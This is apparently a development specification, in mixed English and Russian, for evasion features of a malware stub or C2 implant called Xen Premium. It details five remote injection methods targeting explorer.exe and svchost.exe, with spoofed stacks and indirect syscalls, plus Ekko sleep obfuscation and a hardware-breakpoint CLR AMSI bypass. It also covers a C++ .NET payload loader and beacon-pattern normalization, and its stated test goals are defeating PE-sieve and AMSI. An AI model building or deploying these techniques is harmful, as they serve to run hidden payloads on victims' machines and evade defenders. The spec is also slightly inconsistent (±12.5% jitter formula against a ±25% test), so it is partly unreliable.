# Tier 2: Advanced Evasion — Detailed Specification

**Parent:** [Master Design](2026-05-25-xen-premium-master-design.md)
**Status:** Updated (8 проблем исправлены)
**Priority:** STRONG ADVANTAGE
**Milestone:** M3
**Dependencies:** Tier 1 (indirect syscalls, call stack spoofing, anti-mem scan)

---

## 7. Remote Injection Suite

**Files to modify:** `GodMode.h`, `GodMode.cpp`
**Files to add:** `Injection.h`, `Injection.cpp`
**StubConfig flag:** `bRemoteInjection`

### Architecture

Current execution methods (GodMode.cpp): RunPE, ModuleStomp, CallbackProxy — all local process manipulation.

New: Remote process injection — inject payload into a running process.

### Injection Methods

```
Method 1: NtCreateSection + NtMapViewOfSection (Cross-Process Section Mapping)
  1. NtCreateSection (local) → section handle
  2. NtWriteVirtualMemory (local view) → write payload
  3. NtMapViewOfSection (remote) → map into target process
  4. NtCreateThreadEx (remote) → execute at mapped address
  Advantage: No WriteProcessMemory needed.

Method 2: APC Injection (QueueUserAPC / NtQueueApcThread)
  1. NtOpenProcess → target handle
  2. VirtualAllocEx (remote) → allocate
  3. WriteProcessMemory → write payload
  4. NtQueueApcThread → queue APC on alertable thread

Method 3: Thread Hijacking
  1. NtOpenProcess + NtOpenThread → target thread
  2. NtSuspendThread, GetThreadContext → save state
  3. SetThreadContext → redirect RIP to payload
  4. NtResumeThread → payload executes
  Advantage: No new thread created.

Method 4: Process Hollowing+ (Enhanced RunPE for remote)
  1. CreateProcess (SUSPENDED) → svchost.exe
  2. NtUnmapViewOfSection → hollow
  3. Write PE sections, fix relocations, fix PEB
  4. SetThreadContext → entry point, NtResumeThread
  Enhancement: indirect syscalls + spoofed stack + anti-mem scan

Method 5: CALLBACK Enum-Based
  1. Allocate + write payload in target process
  2. Use CreateTimerQueueTimer, EnumChildWindows, CreateRemoteThread
  3. Payload executes as callback inside legitimate API dispatch
```

All injection calls use call stack spoofing (#5) + indirect syscalls (#3).

### Target Process Selection

```
Priority: explorer.exe, svchost.exe, RuntimeBroker.exe, taskhostw.exe, dllhost.exe
Criteria: running, accessible, same session, not protected (PP/PPL), x64
```

### Testing

- Each method works against notepad.exe
- Stack trace shows legitimate return addresses
- PE-sieve does not flag injected code

---

## 8. Ekko/Foliage Sleep Obfuscation

**Files to modify:** `SleepObf.h`, `SleepObf.cpp`
**Files to add:** None (enhance existing)
**StubConfig flag:** `bEkkoSleep` (replaces `bSleepObf`)

### Architecture

Current: Simple XOR during Sleep, key=GetTickCount()^0xDEADBEEF, 8s default.
Problem: Memory structurally intact during sleep, XOR trivially reversible.

New: Full memory + heap encryption during sleep using NtContinue context chain.

### Ekko Sleep Flow

```
1. CreateTimerQueueTimer → timer fires after jittered interval
2. Save current thread context (CONTEXT struct)
3. Encrypt ALL memory:
   a. VirtualQuery → enumerate our regions
   b. ChaCha20 encrypt (PureCrypto, no Windows API calls)
   c. HeapWalk → encrypt committed heap blocks
   d. VirtualProtect → PAGE_READWRITE (remove EXECUTE)
4. NtContinue → thread "sleeps" with encrypted memory
5. Timer fires → WakeCallback:
   a. Decrypt all regions (reverse of step 3)
   b. Restore EXECUTE attributes
   c. NtContinue with original CONTEXT → resume
6. Jitter: base_interval + rand() % (base_interval / 4)
```

### Dependencies on Tier 1

- NtContinue: indirect syscalls (#3)
- NtGetContextThread/NtSetContextThread: indirect syscalls (#3)
- All sensitive calls: spoofed stack (#5)
- Memory encryption: PureCrypto (existing, zero API calls)

### Testing

- Memory encrypted during sleep, decrypted after wake
- No second thread created
- Sleep interval has jitter
- PE-sieve during sleep shows only encrypted data

---

## 9. .NET Assembly Loading

**Files to add:** `DotNetLoader.h`, `DotNetLoader.cpp`
**StubConfig flag:** `bDotNetLoading`
**HIGH RISK — требует POC (ПРОБЛЕМА #4)**

### ПРОБЛЕМА #4 — ExecuteInDefaultAppDomain требует файл на диске

`ICLRRuntimeHost::ExecuteInDefaultAppDomain()` принимает ТОЛЬКО путь к файлу.
Загрузить .NET assembly чисто из памяти через этот API нельзя.
Нужен обходной путь.

### Multi-Method Strategy

```
Method A — Temp File + Immediate Delete (primary, Tier 2):
  1. Init CLR (mscoree.dll → CLRCreateInstance → ICLRRuntimeHost → Start)
  2. Enable CLR AMSI bypass (DR2 HWBP on clr!AmsiScan)
  3. Write payload to %TEMP%\\[random].dll (stack-built random path)
  4. ExecuteInDefaultAppDomain(tempPath, "Program", "Main", ...)
  5. НЕМЕДЛЕННО удалить temp файл через NtDeleteFile (indirect syscall)
  6. CLR закэшировал assembly в памяти — файл больше не нужен

  Риск: файл на диске ~10-100ms
  Защита: CLR AMSI bypass (DR2) гарантирует что content не детектируется
  Преимущество: простая реализация, работает для 95% assemblies

Method B — Managed Bootstrap (Tier 4, полностью из памяти):
  1. В stub встроен мини managed bootstrap DLL (IL-only, <5KB)
  2. Bootstrap загружается через ExecuteInDefaultAppDomain
  3. Bootstrap регистрирует AssemblyResolve handler в AppDomain
  4. AssemblyResolve: читает byte[] из unmanaged shared section
     через Marshal.Copy, вызывает Assembly.Load(byte[])
  5. Bootstrap вызывает target entry point через reflection

  Преимущество: полностью из памяти, нет дискового I/O
  Недостаток: сложнее, нужен C++/CLI компилятор
  Резерв: реализовать в Tier 4 если Method A недостаточен

CLR-Level AMSI Bypass:
  - Locate clr.dll!AmsiScan (не amsi.dll!AmsiScanBuffer)
  - Set DR2 hardware breakpoint
  - VEH handler: RAX=0x80070057, advance RIP
  - Zero bytes modified in clr.dll
```

### Implementation (Method A)

```cpp
namespace DotNetLoader {
    bool IsDotNetAssembly(PVOID pPayload, SIZE_T sz) {
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pPayload;
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)pPayload + dos->e_lfanew);
        return nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].Size > 0;
    }

    bool LoadAndExecute(PVOID pPayload, SIZE_T sz,
                        LPCWSTR className, LPCWSTR methodName) {
        ICLRRuntimeHost* pHost = InitCLR();
        if (!pHost) return false;

        PatchlessBypass::EnableClrAmsiBypass();

        // Write to temp file (stack-built random path)
        WCHAR tempPath[MAX_PATH];
        BuildRandomTempPath(tempPath);
        WritePayloadToTemp(tempPath, pPayload, sz);

        // Execute in AppDomain
        DWORD ret = 0;
        HRESULT hr = pHost->ExecuteInDefaultAppDomain(
            tempPath, className, methodName, L"", &ret);

        // Delete IMMEDIATELY (even if execution failed)
        DeleteFileImmediate(tempPath);  // NtDeleteFile via indirect syscall

        return SUCCEEDED(hr);
    }
}
```

### POC требование

- Загрузить HelloWorld.exe через Method A с CLR AMSI bypass
- Assembly выполняется, temp файл удалён, AMSI возвращает clean
- Если POC проваливается → откладываем .NET loading

---

## 10. Thread Behavior Normalization

**Files to modify:** `ThreadPool.h`, `ThreadPool.cpp`, `SleepObf.cpp`
**Files to add:** `ThreadNormalizer.h`, `ThreadNormalizer.cpp`
**StubConfig flag:** `bThreadNormalization`

### Architecture

Problem: C2 beacons exhibit detectable patterns — fixed sleep, single thread, predictable callbacks.

### Normalization Techniques

```
1. Sleep Jitter
   Replace all Sleep() → JitteredSleep(baseMs)
   JitteredSleep: baseMs - (baseMs/8) + rand() % (baseMs/4)
   Range: -12.5% to +12.5% variation

2. Callback Diversification
   Rotate between:
   - ThreadPool work (TpAllocWork + TpPostWork)
   - Timer callbacks (CreateTimerQueueTimer)
   - APC to self (NtQueueApcThread + SleepEx alertable)
   - WSA wait callbacks
   Each iteration picks random callback type.

3. Thread Pool Creation
   Create 2-3 threads with different behaviors:
   - Timer-based thread
   - I/O completion-based thread
   - Wait-based thread

4. Noise Injection
   Add benign operations between real work:
   - ReadFile on Windows log files
   - GetSystemTime, GetTickCount
   - Registry reads (HKLM normal keys)
```

### Integration

- Replace all Sleep() with ThreadNormalizer::JitteredSleep()
- Replace ThreadPool with ExecuteWithNormalizedCallback()
- Ekko sleep uses JitteredSleep for interval
- Remote injection uses normalized callbacks

### Testing

- Sleep intervals show ±25% jitter
- Callback type varies between iterations
- No single thread handles all work
